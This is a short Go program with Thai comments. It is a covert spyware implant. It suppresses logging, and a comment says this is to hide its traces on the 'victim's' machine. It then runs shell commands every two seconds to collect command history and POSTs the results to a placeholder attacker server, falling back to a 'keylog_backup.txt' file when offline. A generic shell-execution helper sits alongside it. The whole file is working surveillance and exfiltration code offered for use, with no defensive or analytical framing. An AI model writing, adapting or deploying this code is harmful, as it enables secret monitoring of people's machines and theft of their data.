package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"
	"net/http"
)

// <<< แก้ตรงนี้: ใส่ IP ของ Server ที่รัน Docker ไว้ >>>
const serverURL = "http://YOUR_SERVER_IP:8080/stream" 

func sendLog(data []byte) {
	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer(data))
	if err != nil {
		// ถ้าเน็ตหลุด ให้บันทึกลงไฟล์สำรอง
		os.WriteFile("keylog_backup.txt", data, 0644)
	} else {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func runCommand(cmd string) string {
	c := exec.Command("sh", "-c", cmd) // Linux/Mac
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd) // Windows
	}
	out, _ := c.CombinedOutput()
	return string(out)
}

func main() {
	log.SetOutput(io.Discard) // ซ่อน Log บนเครื่องเหยื่อ
	
	// สร้าง ID เครื่อง
	id := "host-" + os.Getenv("COMPUTERNAME")
	if id == "host-" {
		id = "host-" + os.Getenv("HOSTNAME")
	}
	
	// แจ้งเตือนว่าเริ่มทำงานแล้ว
	info := fmt.Sprintf("[INIT] Started on %s | PID: %d | OS: %s\n", id, os.Getpid(), runtime.GOOS)
	sendLog([]byte(info))

	// Loop ส่งข้อมูลทุก ๆ 2 วินาที
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// ตัวอย่าง: ดึง Command History ล่าสุด
			cmd := "history | tail -n 5"
			if runtime.GOOS == "windows" {
				cmd = "doskey /history"
			}
			
			output := runCommand(cmd)
			if output != "" {
				sendLog([]byte(fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), output)))
			}
		}
	}
}